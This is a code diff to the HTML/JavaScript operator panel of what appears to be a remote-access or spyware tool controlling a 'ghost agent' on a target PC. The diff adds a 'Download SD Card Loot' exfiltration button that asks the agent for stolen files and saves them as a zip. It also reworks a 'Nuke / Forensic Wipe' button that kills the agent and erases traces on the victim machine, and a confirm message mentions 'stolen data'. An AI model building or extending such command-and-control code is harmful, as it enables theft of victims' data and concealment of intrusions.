@@ -157,9 +157,15 @@
             </div>
         </div>
 
-        <div style="margin-top: 15px; border-top: 1px dashed #ef4444; padding-top: 15px;">
-            <div class="mode-text" style="margin-bottom: 8px; color: #ef4444; font-weight: bold;">⚠️ DANGER ZONE:</div>
-            <button id="wipeBtn" style="background-color: #ef4444; width: 100%; border: 1px solid #b91c1c;">Nuke / Forensic Wipe Agent</button>
+        <div style="margin-top: 15px; border-top: 1px dashed #ef4444; padding-top: 15px; display: flex; gap: 10px;">
+            <div style="flex: 1;">
+                <div class="mode-text" style="margin-bottom: 8px; color: #10b981; font-weight: bold;">📦 DATA EXFILTRATION:</div>
+                <button id="downloadLootBtn" style="background-color: #10b981; width: 100%; border: 1px solid #059669;">Download SD Card Loot</button>
+            </div>
+            <div style="flex: 1;">
+                <div class="mode-text" style="margin-bottom: 8px; color: #ef4444; font-weight: bold;">⚠️ DANGER ZONE:</div>
+                <button id="wipeBtn" style="background-color: #ef4444; width: 100%; border: 1px solid #b91c1c;">Nuke / Forensic Wipe</button>
+            </div>
         </div>
 
         <div class="terminal" id="terminalLog">
@@ -368,13 +374,27 @@
         }
 
         // Wipe Button Logic
-        document.getElementById('wipeBtn').addEventListener('click', () => {
-            if (confirm("WARNING: This will permanently delete the agent script and all stolen data from the target PC. Proceed?")) {
-                socket.emit('trigger_wipe');
-                log("SENT WIPE COMMAND TO AGENT.");
-                document.getElementById('statusBadge').className = 'status-badge offline';
-                document.getElementById('statusBadge').textContent = '☠️ DEAD';
+        const wipeBtn = document.getElementById('wipeBtn');
+        const downloadLootBtn = document.getElementById('downloadLootBtn');
+
+        wipeBtn.addEventListener('click', () => {
+            if (confirm("WARNING: This will instantly kill the ghost agent and wipe all traces on the target PC. Are you sure?")) {
+                socket.emit('wipe_agent');
+                log("SENT WIPE COMMAND TO ACTIVE TARGET!");
             }
+        });
+
+        downloadLootBtn.addEventListener('click', () => {
+            log("Requesting Loot from Agent... This may take a minute depending on file size.");
+            socket.emit('download_loot');
+        });
+
+        socket.on('loot_data', (data) => {
+            log("Loot received! Downloading...");
+            const a = document.createElement("a");
+            a.href = "data:application/zip;base64," + data;
+            a.download = `GhostLoot_${new Date().getTime()}.zip`;
+            a.click();
         });
     </script>
 </body>
